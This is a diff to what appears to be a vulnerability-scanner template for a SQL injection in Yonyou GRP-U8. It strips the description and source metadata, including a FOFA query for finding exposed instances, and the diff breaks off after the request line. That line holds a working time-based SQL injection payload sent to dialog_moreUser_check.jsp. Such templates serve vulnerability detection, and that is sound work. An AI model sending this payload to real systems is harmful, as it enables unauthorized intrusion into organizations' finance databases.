@@ -3,12 +3,8 @@ info:
   name: 用友GRP-U8 dialog_moreUser_check SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pg0bfeulgx6slp96'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pg0bfeulgx6slp96
-    fofa: app="用友-GRP-U8"
 http:
 - raw:
   - 'GET /u8qx/dialog_moreUser_check.jsp?mlid='';waitfor+delay+''0:0:5''-- HTTP/1.1
